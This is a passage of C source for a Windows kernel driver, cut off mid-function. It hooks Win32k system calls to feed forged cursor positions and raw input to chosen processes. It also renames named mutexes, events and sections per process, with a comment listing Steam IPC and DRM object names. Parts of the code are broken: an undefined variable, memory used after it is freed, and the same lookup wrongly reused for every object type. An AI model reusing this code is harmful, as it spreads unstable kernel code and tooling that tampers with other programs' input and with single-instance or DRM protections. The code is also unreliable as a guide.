EXTERN_C BOOLEAN  IOSysBuffer(DWORD IOMajor, PVOID64 gBuffer);

HANDLE NTAPI Br_NtUserCallTwoParam(void* Src, DWORD64 A, DWORD64 B)
{

#ifdef USE_NT_MSG
	if (B == 0xFFFF)
	{
		return IOSysBuffer(A, flags);
		// return TrueNtUserCallTwoParam(flags, A, B);
	}
#endif // USE_NT_MSG

	//ExEnterCriticalRegionAndAcquireResourceExclusive
	//EnterPriorityRegionAndAcquireResourceExclusive
	FILTER_PID Info = { 0 };
	Info.dwPID = PsGetCurrentProcessId();

	FILTER_PID* pGr = AVL_LOCK_CHANGE(AVL_LOCK, &TableAvl_Mouse, &Info);
	if (pGr == 0)
	{
		//LOG_DEBUG("%d  <%p> <%p> <%p>\n", PsGetCurrentProcessId(), flags, A, B);
		return TrueNtUserCallTwoParam(Src, A, B);
	}
	if (pGr->bON)
	{
		if (OsVersion.dwMajorVersion == 6 && OsVersion.dwMinorVersion == 1)
		{
			if (B == TwoType && (pGr->Type & 1))
			{
				HANDLE zHandle = TrueNtUserCallTwoParam(Src, A, B);
				KIRQL irql = KfRaiseIrql(APC_LEVEL);
				__try {
					ProbeForWrite(Src, sizeof(BRPOINT), 1);
					//ProbeForRead(&pGr->p, sizeof(BRPOINT), 1);
					RtlCopyMemory(Src, &pGr->p, sizeof(BRPOINT));
				}
				__except (1) {

				}
				KeLowerIrql(irql);
				AVL_LOCK_CHANGE(AVL_UNLOCK, &TableAvl_Mouse, &Info);
				return zHandle;
			}
			//if (B == 0x74 && (pGr->Type & 2))
			//{
			//	AVL_LOCK_CHANGE(AVL_UNLOCK, &TableAvl_Mouse, &Info);
			//	return 1;
			//}
		}
		else if (B == TwoType && ((DWORD)A == 1) && (pGr->Type & 1))
		{
			HANDLE zHandle = TrueNtUserCallTwoParam(Src, A, B);
			KIRQL irql = KfRaiseIrql(APC_LEVEL);
			__try {
				ProbeForWrite(Src, sizeof(BRPOINT), 1);
				//ProbeForRead(&pGr->p, sizeof(BRPOINT), 1);
				RtlCopyMemory(Src, &pGr->p, sizeof(BRPOINT));
				LOG_DEBUG("point x:%d y: %d\n", pGr->p.x, pGr->p.y);
			}
			__except (1) {

			}
			KeLowerIrql(irql);
			AVL_LOCK_CHANGE(AVL_UNLOCK, &TableAvl_Mouse, &Info);
			return zHandle;
		}
	}
	return TrueNtUserCallTwoParam(Src, A, B);
}

//p_NtUserGetRawInputBuffer TrueNtUserGetRawInputBuffer = 0;
//
//UINT Br_NtUserGetRawInputBuffer(PRAWINPUT pData, PUINT pcbSize, UINT  cbSizeHeader) 
//{
//   UINT r = 0;
//
//   FIX_KeyBoard * pFore = getFixKeyBoard(PsGetCurrentProcessId());
//   if (pFore == NULL)
//   {
//
//   }
//
//   //if (pData == 0)
//   //{
//	  r =  TrueNtUserGetRawInputBuffer(pData, pcbSize, cbSizeHeader);
//	  LOG_DEBUG("Raw PID %d  ,Szie %d  ,Size Header %d \n", PsGetCurrentProcessId(), *pcbSize, cbSizeHeader);
// //  }
//
//   return r;
//  // UINT r = TrueNtUserGetRawInputBuffer(pData, pcbSize, cbSizeHeader);
//
//}




BOOLEAN AddInputData(HANDLE dwID, RAWINPUT* _Raw) {
	__try
	{
		//DWORD64 uType = WeGetProcessType(dwID);
		//if ((uType & 4) == 0)
		//{
		//	PEPROCESS Process = 0;
		//	NTSTATUS rNt = PsLookupProcessByProcessId(dwID, &Process);
		//	if (NT_SUCCESS(rNt) && Process != 0)
		//	{
		//		KAPC_STATE stack = { 0 };
		//		KeStackAttachProcess(Process, &stack);
		//		IniInputData();
		//		KeUnstackDetachProcess(&stack);
		//		ObDereferenceObject(Process);
		//		WeSetProcessType(dwID, uType | 4);
		//	}
		//}


		if (!bIniInput)
		{
			bIniInput = IniInputData();
			//return FALSE;
		}
		//if (bIniInput)
		//{
		FILTER_PID Info = { 0 };
		Info.dwPID = dwID;
		FILTER_PID* pGr = AVL_LOCK_CHANGE(AVL_LOCK, &TableAvl_Data_Input, &Info);
		if (pGr != 0)
		{
			RtlCopyMemory(&pGr->Raw, _Raw, sizeof(RAWINPUT));
			return AVL_LOCK_CHANGE(AVL_UNLOCK, &TableAvl_Data_Input, &Info) != 0;
		}
		RtlCopyMemory(&Info.Raw, _Raw, sizeof(RAWINPUT));
		return AVL_LOCK_CHANGE(AVL_ADD, &TableAvl_Data_Input, &Info) != 0;
		//}
	}
	__except (1) {
		LOG_DEBUG("_except %s %08X\n", __FUNCTION__, GetExceptionCode());
	}
	return FALSE;
}


p_NtUserGetRawInputData TrueNtUserGetRawInputData = 0;
DWORD NtUserGetRawInputDataIndex = 0xFFFFFFFF;
#define RIM_TYPEMOUSE       0
#define RIM_TYPEKEYBOARD    1
#define RIM_TYPEHID         2
#define RIM_TYPEMAX         2




HANDLE NTAPI Br_NtUserGetRawInputData(HRAWINPUT hRawInput, UINT uiCommand, void* pData, PUINT pcbSize, UINT cbSizeHeader)
{
	//LOG_DEBUG("%s\n", __FUNCTION__);
	__try
	{
		if (hRawInput != NULL)
		{
			return TrueNtUserGetRawInputData(hRawInput, uiCommand, pData, pcbSize, cbSizeHeader);
		}
		FILTER_PID Info = { 0 };
		Info.dwPID = PsGetCurrentProcessId();
		FILTER_PID* pGr = AVL_LOCK_CHANGE(AVL_LOCK, &TableAvl_Data_Input, &Info);;
		if (pGr == 0)
		{
			return TrueNtUserGetRawInputData(hRawInput, uiCommand, pData, pcbSize, cbSizeHeader);
		}
		if (pData == NULL)
		{
			KIRQL irql = KfRaiseIrql(APC_LEVEL);
			__try {
				ProbeForWrite(pcbSize, 4, 1);
				*pcbSize = 48;
			}
			__except (1) {
				LOG_DEBUG("except %s  %08X\n", __FUNCTION__, GetExceptionCode());
			}
			KeLowerIrql(irql);
		}
		else
		{
			PRAWINPUT Raw = (PRAWINPUT)pData;
			KIRQL irql = KfRaiseIrql(APC_LEVEL);
			__try {
				ProbeForWrite(Raw, 48, 1);
				RtlCopyMemory(Raw, &pGr->Raw, sizeof(RAWINPUT));
				LOG_DEBUG("Raw.mouse.usButtonFlags  %08X\n", Raw->data.mouse.usButtonFlags);
			}
			__except (1) {
				LOG_DEBUG("except %s  %08X\n", __FUNCTION__, GetExceptionCode());
			}
			KeLowerIrql(irql);
		}
		AVL_LOCK_CHANGE(AVL_UNLOCK, &TableAvl_Data_Input, &Info);
		LOG_DEBUG("Raw PID %d ,<%p> ,uiCommand %08X  ,pData %p   pcbSize %d cbSizeHeader %d\n", PsGetCurrentProcessId(), hRawInput, uiCommand, pData, *pcbSize, cbSizeHeader);
		return (HANDLE)sizeof(RAWINPUT);
	}
	__except (1) {

		LOG_DEBUG("_except %s %08X\n", __FUNCTION__, GetExceptionCode());

	}

	return 0;

}






BOOLEAN FindMemory(char* pA, int Alen, char* pB, int Blen) {

	__try
	{
		if (Alen < Blen) {
			return FALSE;
		}
		for (int i = 0; i < ((Alen - Blen) + 1); i++)
		{
			if (RtlEqualMemory(&pA[i], pB, Blen))
			{
				return TRUE;
			}
		}
	}
	__except (1) {

	}
	return FALSE;
}

int findUnicodeString(UNICODE_STRING* SRC, UNICODE_STRING* b) {
	//return FindMemory(SRC->Buffer, SRC->Length, b->Buffer, b->Length);
	return 0;
}


//----------------------------------
typedef struct _FORE_MUTEX_PID
{
	LIST_ENTRY List;
	HANDLE PID;
	int  Hwnd;
}FORE_MUTEX_PID;








typedef struct nameEntry {
	LIST_ENTRY nlist;
	UNICODE_STRING name;
	BOOLEAN cutName;
	struct nameEntry* arryNameArryList;
	KSPIN_LOCK Spin_Lock;
	int Lock_Number;
	BOOLEAN IsUse;
	DWORD iTypeProcessID;
}nameEntry;



static nameEntry arryNameMetux[256];

static nameEntry arryNameEvent[256];

static nameEntry arryNameSection[256];

#define METUX_FIND 0
#define METUX_ADD 1
#define METUX_DEL 2
#define METUX_SEARCH 3
#define METUX_LOCK 4
#define METUX_UNLOCK 5
#define METUX_DEL2 6

pNtOpenMutant TrueNtOpenMutant = 0;
pNtCreateMutant TrueNtCreateMutant = 0;

pNtOpenEvent TrueNtOpenEvent = 0;
pNtCreateEvent TrueNtCreateEvent = 0;

pNtOpenSection TrueNtOpenSection = 0;
pNtCreateSection TrueNtCreateSection = 0;


BOOLEAN  RemoveNameEntry(nameEntry* dNameEntry) {

	if (dNameEntry == NULL) {
		return FALSE;
	}
	if (dNameEntry->arryNameArryList != NULL)
	{
		for (int i = 0; i < 256; i++)
		{
			nameEntry* pEntry = &dNameEntry->arryNameArryList[i];
			nameEntry* cur = (nameEntry*)pEntry->nlist.Flink;
			while (cur != pEntry)
			{
				nameEntry* nW = (nameEntry*)cur->nlist.Flink;
				if (cur->Lock_Number != 0)
				{
					LOG_DEBUG("[%d]  %s --Lock_Number %d \n", __LINE__, __FUNCTION__, cur->Lock_Number);
					return FALSE;
				}
				RemoveNameEntry(cur);
				cur = nW;
			}
		}
		ExFreePoolWithTag(dNameEntry->arryNameArryList, 'tag');
	}
	RemoveEntryList(&dNameEntry->arryNameArryList->nlist);
	LOG_DEBUG("[%d]  %s --Remove %wZ \n", __LINE__, __FUNCTION__, &dNameEntry->name);
	RtlFreeUnicodeString(&dNameEntry->name);
	ExFreePoolWithTag(dNameEntry, 'tag');
	return TRUE;
}




// 查询数据返回指针时  一定会锁住数据一定要调用解锁函数 否者无法DEL
BOOLEAN nameEntryChange(int Type, nameEntry* arryNameEntry, nameEntry** wEntry, UNICODE_STRING* name) {

	if (arryNameEntry == NULL) {
		return FALSE;
	}
	KIRQL irql;
	KeAcquireSpinLock(&arryNameEntry->Spin_Lock, &irql);
	BOOLEAN R = FALSE;
	__try {

		if (Type == METUX_FIND) {

			if (name->Length != 0) {

				nameEntry* pEntry = arryNameEntry;
				nameEntry* cur = (nameEntry*)pEntry->nlist.Flink;
				while (cur != pEntry)
				{
					if (cur->name.Length == 0) {
						break;
					}
					if (cur->IsUse)
					{
						if (RtlCompareUnicodeString(&cur->name, name, TRUE) == 0)
						{
							cur->Lock_Number++;
							*wEntry = cur;
							R = TRUE;
							break;
						}
					}
					cur = (nameEntry *)cur->nlist.Flink;
				}
			}

		}
		else if (Type == METUX_ADD) {
			InsertHeadList(&arryNameEntry->nlist, &((*wEntry)->nlist));
		}
		else if (Type == METUX_DEL) {

			if (name->Length != 0) {

				char* pName_ = (char *)name->Buffer;
				nameEntry* pEntry = arryNameEntry;
				nameEntry* cur = (nameEntry*)pEntry->nlist.Flink;
				while (cur != pEntry)
				{
					if (cur->name.Length == 0) {
						break;
					}

					if (RtlCompareUnicodeString(&cur->name, name, TRUE) == 0)
					{
						RemoveNameEntry(cur);
						R = TRUE;
						break;
					}
					cur = (nameEntry *)cur->nlist.Flink;
				}
			}
		}
		else if (Type == METUX_SEARCH) {

			if (name->Length != 0) {
				nameEntry* pEntry = arryNameEntry;
				nameEntry* cur = (nameEntry *)pEntry->nlist.Flink;
				while (cur != pEntry)
				{
					if (cur->name.Length == 0) {
						break;
					}
					if (findUnicodeString(name, &cur->name))
					{
						cur->Lock_Number++;
						*wEntry = cur;
						R = TRUE;
						break;
					}
					cur = (nameEntry*)cur->nlist.Flink;
				}
			}
		}
		else if (Type == METUX_LOCK) {
			(*wEntry)->Lock_Number++;
		}
		else if (Type == METUX_UNLOCK) {

			if ((*wEntry)->Lock_Number > 0)
			{
				(*wEntry)->Lock_Number--;
				if ((*wEntry)->Lock_Number == 0 && (*wEntry)->IsUse == FALSE)
				{
					RemoveNameEntry((*wEntry));
				}
				R = TRUE;
			}
		}
		else if (Type == METUX_DEL2) {

			if ((*wEntry)->Lock_Number == 0)
			{
				LOG_DEBUG("[%d]  %s \n", __LINE__, __FUNCTION__);
				R = RemoveNameEntry((*wEntry));
			}
			else
			{
				LOG_DEBUG("[%d]  %s \n", __LINE__, __FUNCTION__);
				(*wEntry)->IsUse = FALSE;
			}

		}

	}
	__except (EXCEPTION_EXECUTE_HANDLER) {

		LOG_DEBUG("[%d]  EXCEPTION %s \n", __LINE__, __FUNCTION__);

		KeReleaseSpinLock(&arryNameEntry->Spin_Lock, irql);
		return FALSE;

	}

	KeReleaseSpinLock(&arryNameEntry->Spin_Lock, irql);
	return R;
	//return FALSE;
}

BOOLEAN findNameEntry(nameEntry* arryNameEntry, UNICODE_STRING* name, nameEntry** nEntry) {

	if (name->Length == 0) {
		return FALSE;
	}
	char* pName_ = (char *)name->Buffer;
	nameEntry* pEntry = &arryNameEntry[pName_[0]];
	nameEntry* cur = (nameEntry*)pEntry->nlist.Flink;
	while (cur != pEntry)
	{
		if (cur->name.Length == 0) {
			//LOG_DEBUG("length=0  [%d] %wZ  %wZ\n", __LINE__, name, &cur->name);
			break;
		}
		//UNICODE_STRING nameUpA;
		//LOG_DEBUG("[%d] %wZ  %wZ\n", __LINE__, name , &cur->name);
		if (RtlCompareUnicodeString(&cur->name, name, TRUE) == 0)
		{
			//RtlCopyMemory(nEntry, cur, sizeof(nameEntry));
			*nEntry = cur;
			return TRUE;
		}
		//LOG_DEBUG("NO[%d] %wZ  %wZ\n", __LINE__, name, &cur->name);
		cur = (nameEntry*)cur->nlist.Flink;
	}
	return FALSE;
}

BOOLEAN unlock_nameEntry(nameEntry* ArryNameEntry, nameEntry* uNameEntry) {

	char* nameNo = (char*)uNameEntry->name.Buffer;
	nameEntry* Head = &ArryNameEntry[nameNo[0]];
	return nameEntryChange(METUX_UNLOCK, Head, &uNameEntry, 0);
}

BOOLEAN findEvent(UNICODE_STRING* name, nameEntry** nEntry) {
	UNICODE_STRING up;
	if (RtlUpcaseUnicodeString(&up, name, TRUE) != STATUS_SUCCESS) {
		return FALSE;
	}
	char* pCH = (char*)up.Buffer;
	nameEntry* Head = &arryNameEvent[pCH[0]];
	BOOLEAN r = nameEntryChange(METUX_FIND, Head, nEntry, &up);
	RtlFreeUnicodeString(&up);
	return r;
}

BOOLEAN findMetux(UNICODE_STRING* name, nameEntry** nEntry) {

	UNICODE_STRING up;
	if (RtlUpcaseUnicodeString(&up, name, TRUE) != STATUS_SUCCESS) {
		return FALSE;
	}
	char* pCH = (char*)up.Buffer;
	nameEntry* Head = &arryNameMetux[pCH[0]];
	BOOLEAN r = nameEntryChange(METUX_FIND, Head, nEntry, &up);
	RtlFreeUnicodeString(&up);
	return r;
}

BOOLEAN findSection(UNICODE_STRING* name, nameEntry** nEntry) {

	UNICODE_STRING up;
	if (RtlUpcaseUnicodeString(&up, name, TRUE) != STATUS_SUCCESS) {
		return FALSE;
	}
	char* pCH = (char*)up.Buffer;
	nameEntry* Head = &arryNameSection[pCH[0]];
	BOOLEAN r = nameEntryChange(METUX_FIND, Head, nEntry, &up);
	RtlFreeUnicodeString(&up);
	return r;
}

BOOLEAN findCutName(nameEntry* arryNameEntry, UNICODE_STRING* name, nameEntry** pEntry) {

	//if (arryNameEntry == 0)
	//{
	//	return FALSE;
	//}

	if (name->Length == 0) {
		return FALSE;
	}
	//char* pName_ = name->Buffer;
	//
	//nameEntry* pEntry = &arryNameEntry[pName_[0]];

	//nameEntry* cur = pEntry->nlist.Flink;
	//
	//while (cur != pEntry)
	//{
	//	if (cur->name.Length == 0) {
	//		//LOG_DEBUG(" [line %d] == break ", __LINE__);
	//		break;
	//	}
	//	if (findUnicodeString(name, &cur->name))
	//	{
	//		return TRUE;
	//	}
	//	cur = cur->nlist.Flink;
	//}
	//return FALSE;

	char* pCH = (char*)name->Buffer;
	nameEntry* Head = &arryNameEntry[pCH[0]];
	return  nameEntryChange(METUX_SEARCH, Head, pEntry, name);
}





//BOOLEAN Add_ENTRY_TEXT(nameEntry* arryNameEntry, UNICODE_STRING* name, UNICODE_STRING* cutName, DWORD iType) {
//
//	nameEntry* pEntry = 0;
//
//	LOG_DEBUG("[%d]  %s \n", __LINE__, __FUNCTION__);
//
//	if (name == 0)
//	{
//		return FALSE;
//	}
//	if (name->Length == 0)
//	{
//		return FALSE;
//	}
//
//	char* pNameProcessCH = (char*)name->Buffer;
//	nameEntry* nameEntryHead = &arryNameEntry[pNameProcessCH[0]];
//	if (nameEntryChange(METUX_FIND, nameEntryHead, &pEntry, name))
//	{
//		if (pEntry->arryNameArryList == NULL)
//		{
//			LOG_DEBUG("[%d]  %s \n", __LINE__, __FUNCTION__);
//			unlock_nameEntry(arryNameEntry, pEntry);
//			return FALSE;
//		}
//		char* pNameNo = (char*)cutName->Buffer;
//		nameEntry* HeadList = &pEntry->arryNameArryList[pNameNo[0]];
//		nameEntry* pEntryCut = 0;
//		if (nameEntryChange(METUX_FIND, HeadList, &pEntryCut, cutName))
//		{
//			LOG_DEBUG("[%d]  %s \n", __LINE__, __FUNCTION__);
//			unlock_nameEntry(arryNameEntry,pEntry);
//			unlock_nameEntry(pEntry->arryNameArryList,pEntryCut);
//			return FALSE;
//		}
//		nameEntry* r = ExAllocatePoolWithTag(PagedPool, sizeof(nameEntry),'tag');
//		if (r == NULL)
//		{
//			LOG_DEBUG("[%d]  %s \n", __LINE__, __FUNCTION__);
//			unlock_nameEntry(arryNameEntry,pEntry);
//			return FALSE;
//		}
//
//		RtlZeroMemory(r, sizeof(nameEntry));
//		RtlCopyMemory(&r->name, cutName, sizeof(UNICODE_STRING));
//		KeInitializeSpinLock(&r->Spin_Lock);
//		//InsertHeadList(&HeadList->nlist, r);
//		r->iTypeProcessID = iType;
//		r->IsUse = TRUE;
//		nameEntryChange(METUX_ADD, HeadList, &r, NULL);
//		unlock_nameEntry(arryNameEntry,pEntry);
//		//	unlock_nameEntry(pEntryCut);
//		LOG_DEBUG("[%d] add success \n", __LINE__);
//		return TRUE;
//
//	}
//
//
//	LOG_DEBUG("[%d]  %s \n", __LINE__, __FUNCTION__);
//	nameEntry* r = ExAllocatePoolWithTag(PagedPool, sizeof(nameEntry),'tag');
//	if (r == NULL)
//	{
//		return FALSE;
//	}
//	RtlZeroMemory(r, sizeof(nameEntry));
//	RtlCopyMemory(&r->name, name, sizeof(UNICODE_STRING));
//
//	LOG_DEBUG("[%d]  %s \n", __LINE__, __FUNCTION__);
//	UNICODE_STRING  Rnull = RTL_CONSTANT_STRING(L"NULL");
//	if (RtlCompareUnicodeString(&Rnull, cutName, TRUE) != 0)
//	{
//		nameEntry* rZ = ExAllocatePoolWithTag(PagedPool, sizeof(nameEntry) * 256,'tag');
//		if (rZ != 0)
//		{
//			RtlZeroMemory(rZ, sizeof(nameEntry) * 256);
//			for (int i = 0; i < 256; i++) {
//				InitializeListHead(&rZ[i].nlist);
//				KeInitializeSpinLock(&rZ[i].Spin_Lock);
//			}
//
//			r->arryNameArryList = rZ;
//			char* pNameNo = (char*)cutName->Buffer;
//			nameEntry* HeadList = &r->arryNameArryList[pNameNo[0]];
//			nameEntry* rG = ExAllocatePoolWithTag(PagedPool, sizeof(nameEntry),'tag');
//			if (rG == NULL)
//			{
//				LOG_DEBUG("[%d]  %s \n", __LINE__, __FUNCTION__);
//				ExFreePoolWithTag(rZ, 'tag');
//				return FALSE;
//			}
//			RtlZeroMemory(rG, sizeof(nameEntry));
//			RtlCopyMemory(&rG->name, cutName, sizeof(UNICODE_STRING));
//			KeInitializeSpinLock(&rG->Spin_Lock);
//			rG->IsUse = TRUE;
//			rG->iTypeProcessID = iType;
//			InsertHeadList(HeadList, rG);
//			r->cutName = TRUE;
//		}
//
//		LOG_DEBUG("[%d]  %s \n", __LINE__, __FUNCTION__);
//	}
//	LOG_DEBUG("[%d]  %s \n", __LINE__, __FUNCTION__);
//	char* pNameNoZero = name->Buffer;
//	//InsertHeadList(&arryNameEntry[pNameNoZero[0]], r);
//	r->IsUse = TRUE;
//	r->iTypeProcessID = iType;
//	nameEntryChange(METUX_ADD, &arryNameEntry[pNameNoZero[0]], &r, NULL);
//	LOG_DEBUG("[%d] add success \n", __LINE__);
//	return TRUE;
//
//}
//BOOLEAN DEL_ENTRY_TEXT(nameEntry* arryNameEntry, UNICODE_STRING* name, UNICODE_STRING* cutName) {
//
//	nameEntry* pEntry = 0;
//
//	LOG_DEBUG("[%d]  %s \n", __LINE__, __FUNCTION__);
//
//	if (name == 0 || cutName == 0)
//	{
//		return FALSE;
//	}
//	if (name->Length == 0 || cutName->Length == 0)
//	{
//		return FALSE;
//	}
//	char* pNameProcessCH = (char*)name->Buffer;
//	nameEntry* nameEntryHead = &arryNameEntry[pNameProcessCH[0]];
//	if (nameEntryChange(METUX_FIND, nameEntryHead, &pEntry, name))
//	{
//		UNICODE_STRING  Rnull = RTL_CONSTANT_STRING(L"NULL");
//		if (RtlCompareUnicodeString(&Rnull, cutName, TRUE) == 0)
//		{
//			unlock_nameEntry(arryNameEntry,pEntry);
//			LOG_DEBUG("[%d]  %s \n", __LINE__, __FUNCTION__);
//			return nameEntryChange(METUX_DEL2, nameEntryHead, &pEntry, 0);
//		}
//		if (pEntry->arryNameArryList == NULL)
//		{
//			LOG_DEBUG("[%d]  %s \n", __LINE__, __FUNCTION__);
//			return FALSE;
//		}
//		char* pNameNo = (char*)cutName->Buffer;
//		nameEntry* HeadList = &pEntry->arryNameArryList[pNameNo[0]];
//		nameEntry* pEntryCut = 0;
//		if (nameEntryChange(METUX_FIND, HeadList, &pEntryCut, cutName))
//		{
//			LOG_DEBUG("[%d]  %s \n", __LINE__, __FUNCTION__);
//			unlock_nameEntry(pEntry->arryNameArryList, pEntryCut);
//			return nameEntryChange(METUX_DEL2, HeadList, &pEntryCut, 0);
//		}
//		return FALSE;
//
//	}
//	return FALSE;
//}
//BOOLEAN Add_MUTEX_TEXT(UNICODE_STRING* name, UNICODE_STRING* cutName,DWORD iType) {
//	return Add_ENTRY_TEXT(arryNameMetux, name, cutName, iType);
//}
//BOOLEAN Add_EVENT_TEXT(UNICODE_STRING* name, UNICODE_STRING* cutName, DWORD iType)
//{
//	return Add_ENTRY_TEXT(arryNameEvent, name, cutName, iType);
//}
//BOOLEAN Add_SECTION_TEXT(UNICODE_STRING* name, UNICODE_STRING* cutName, DWORD iType)
//{
//	return Add_ENTRY_TEXT(arryNameSection, name, cutName, iType);
//}
//BOOLEAN DEL_MUTEX_TEXT(UNICODE_STRING* name, UNICODE_STRING* cutName)
//{
//	return DEL_ENTRY_TEXT(arryNameMetux, name, cutName);
//}
//BOOLEAN DEL_EVENT_TEXT(UNICODE_STRING* name, UNICODE_STRING* cutName)
//{
//	return DEL_ENTRY_TEXT(arryNameEvent, name, cutName);
//}
//BOOLEAN DEL_SECTION_TEXT(UNICODE_STRING* name, UNICODE_STRING* cutName)
//{
//	return DEL_ENTRY_TEXT(arryNameSection, name, cutName);
//}






NTKERNELAPI
UCHAR*
PsGetProcessImageFileName(
	__in PEPROCESS Process
);



//pNtCreateMutant TrueNtCreateMutant = 0;

DWORD number = 0;

//wchar_t* ArryW = L"ABCDEFGHIJKLMNOPQRSTUVWXYZ";
//wchar_t valBuffer[4] = L"AAAA";



//BOOLEAN EqualMemory(char* pA, char* pB, int Alen) {
//	for (int i = 0; i < Alen; i++){
//		if (pA[i] != pB[i]) {
//			return FALSE;
//		}
//	}
//	return TRUE;
//}





//__kernel_entry NTSTATUS NtQueryInformationProcess(
//	 HANDLE           ProcessHandle,
//	 PROCESSINFOCLASS ProcessInformationClass,
//	 PVOID            ProcessInformation,
//	 ULONG            ProcessInformationLength,
//	 PULONG           ReturnLength
//);



HANDLE GetParentProcessID() {

	if (TrueNtQueryInformationProcess == 0)
	{
		return 0;
	}
	PROCESS_BASIC_INFORMATION pbi;

	ULONG nSize = 0;
	NTSTATUS status = TrueNtQueryInformationProcess((HANDLE)-1,
		ProcessBasicInformation, &pbi, sizeof(PROCESS_BASIC_INFORMATION), &nSize);
	if (NT_SUCCESS(status))
	{
		return  (HANDLE)pbi.InheritedFromUniqueProcessId;
	}
	LOG_DEBUG(" error QueryInformationProcess %I64X", status);
	return 0;
}



//DWORD GetParentProcessIDSteam() {
//
//	if (TrueNtQueryInformationProcess == 0)
//	{
//		return 0;
//	}
//	PROCESS_BASIC_INFORMATION pbi;
//
//	ULONG nSize = 0;
//	NTSTATUS status = TrueNtQueryInformationProcess(-1,
//		ProcessBasicInformation, &pbi, sizeof(PROCESS_BASIC_INFORMATION), &nSize);
//	if (NT_SUCCESS(status))
//	{
//		return pbi.InheritedFromUniqueProcessId;
//	}
//	LOG_DEBUG(" error QueryInformationProcess %I64X", status);
//	return 0;
//}







#define METUX_FILTER_EVENT 0
#define METUX_FILTER_METUX 1
#define METUX_FILTER_SECTION 2

BOOLEAN FilterNameEntry(PUNICODE_STRING ObjectName, DWORD iType) {


	UNICODE_STRING processName_UNICODE;
	ANSI_STRING processName_ANSI;

	UCHAR* pProcessName = PsGetProcessImageFileName(PsGetCurrentProcess());

	RtlInitString(&processName_ANSI, pProcessName);

	if (RtlAnsiStringToUnicodeString(&processName_UNICODE, &processName_ANSI, TRUE) == STATUS_SUCCESS)
	{
		//LOG_DEBUG("1: %wZ\n", &processName_UNICODE);
		nameEntry* nEntry = 0;
		BOOLEAN bFind = FALSE;
		if (iType == METUX_FILTER_EVENT)
		{
			if (findEvent(&processName_UNICODE, &nEntry))
			{
				bFind = TRUE;
			}
		}
		else if (iType == METUX_FILTER_METUX)
		{
			if (findEvent(&processName_UNICODE, &nEntry))
			{
				bFind = TRUE;
			}
		}
		else if (iType == METUX_FILTER_SECTION)
		{
			if (findEvent(&processName_UNICODE, &nEntry))
			{
				bFind = TRUE;
			}
		}
		if (bFind)
		{
			if (nEntry->arryNameArryList != NULL)
			{
				BOOLEAN nSucess = 0;
				HANDLE zProcessID = 0;
				if (nEntry->cutName == 0)
				{
					nSucess = TRUE;
					if (nEntry->iTypeProcessID == 0) {
						zProcessID = PsGetCurrentProcessId();
					}
					else if (nEntry->iTypeProcessID == 1) {
						zProcessID = GetParentProcessID();
					}
				}
				if (!nSucess) {
					UNICODE_STRING ObjectNameUP;
					if (RtlUpcaseUnicodeString(&ObjectNameUP, ObjectName, TRUE) == STATUS_SUCCESS)
					{
						//LOG_DEBUG("3: %wZ\n", &ObjectNameUP);
						nameEntry* cNameEntry = 0;
						if (findCutName(nEntry->arryNameArryList, &ObjectNameUP, &cNameEntry))
						{
							if (cNameEntry->iTypeProcessID == 0) {
								zProcessID = PsGetCurrentProcessId();
							}
							else if (cNameEntry->iTypeProcessID == 1) {
								zProcessID = GetParentProcessID();
							}
							nSucess = TRUE;
							unlock_nameEntry(nEntry->arryNameArryList, cNameEntry);
						}
						RtlFreeUnicodeString(&ObjectNameUP);
					}
				}
				if (nSucess)
				{
					int nSize = ObjectName->Length + 0x40;
					wchar_t* pageBuffer = ExAllocatePoolWithTag(PagedPool, nSize, 'tag');
					if (pageBuffer != 0)
					{
						LOG_DEBUG("%s: %wZ %wZ\n", __FUNCTION__, &processName_UNICODE, ObjectName);
						RtlZeroMemory(pageBuffer, nSize);
						RtlStringCbPrintfW(pageBuffer, nSize, L"%ws_%d", ObjectName->Buffer, zProcessID);
						RtlInitUnicodeString(ObjectName, pageBuffer);
						LOG_DEBUG("%s: %wZ %wZ\n", __FUNCTION__, &processName_UNICODE, ObjectName);
					}
				}
				unlock_nameEntry(arryNameMetux, nEntry);
			}
			else
			{
				LOG_DEBUG("%s: %wZ %wZ\n", __FUNCTION__, &processName_UNICODE, ObjectName);
			}
		}

	}
	return FALSE;
}

















_Function_class_(RTL_AVL_COMPARE_ROUTINE)
RTL_GENERIC_COMPARE_RESULTS CompareHandleTableEntry_1(struct _RTL_AVL_TABLE* Table, PVOID  FirstStruct, PVOID  SecondStruct)
{
	TABLE_HANDLE_INFO* first = (PTABLE_HANDLE_INFO)FirstStruct;
	TABLE_HANDLE_INFO* second = (PTABLE_HANDLE_INFO)SecondStruct;

	UNREFERENCED_PARAMETER(Table);
	if (first->hID > second->hID)
		return GenericGreaterThan;
	if (first->hID < second->hID)
		return GenericLessThan;
	return GenericEqual;
}

_Function_class_(RTL_AVL_ALLOCATE_ROUTINE)
PVOID AllocateHandleTableEntry_1(struct _RTL_AVL_TABLE* Table, CLONG  ByteSize)
{
	UNREFERENCED_PARAMETER(Table);
	return ExAllocatePoolWithTag(NonPagedPool, ByteSize, 'tag');
}

_Function_class_(RTL_AVL_FREE_ROUTINE)
VOID FreeHandleTableEntry_1(struct _RTL_AVL_TABLE* Table, PVOID  Buffer)
{
	UNREFERENCED_PARAMETER(Table);
	ExFreePoolWithTag(Buffer, 'tag');
}







//NTSYSCALLAPI NTSTATUS ZwOpenEvent(
//	 PHANDLE            EventHandle,
//	 ACCESS_MASK        DesiredAccess,
//	  POBJECT_ATTRIBUTES ObjectAttributes
//);







//void INI_LIST_ALL() {
//
//	//KeInitializeSpinLock(&_SpinLock_Mutex_Event_Section);
//
//
//}




/*
L"Global\\Valve_SteamIPC_Class" ,
	L"Steam3Master_SharedMemLock",
	L"Steam3Master_SharedMemFile",
	L"Global\\SteamClientService_SharedMemLock",
	L"Global\\SteamClientService_SharedMemFile",
	L"STEAM_DRM_IPC",
	L"Local\\SteamStart_SharedMemFile",
	L"Local\\SteamStart_SharedMemLock"

*/





typedef struct _TABLE_UNICODE_STRING_FILTER {
	DWORD64 LockSelf;
	UNICODE_STRING stringSrc;
	UNICODE_STRING stringReplace;
	DWORD64 Type;
}TABLE_UNICODE_STRING_FILTER, * PTABLE_UNICODE_STRING_FILTER;



_Function_class_(RTL_AVL_COMPARE_ROUTINE)
RTL_GENERIC_COMPARE_RESULTS CompareHandleTableEntryString(struct _RTL_AVL_TABLE* Table, PVOID  FirstStruct, PVOID  SecondStruct)
{
	PTABLE_UNICODE_STRING_FILTER Left = (PTABLE_UNICODE_STRING_FILTER)FirstStruct;
	PTABLE_UNICODE_STRING_FILTER Right = (PTABLE_UNICODE_STRING_FILTER)SecondStruct;
	UNREFERENCED_PARAMETER(Table);


	//if (KeGetCurrentIrql() != PASSIVE_LEVEL)
	//{

	//}
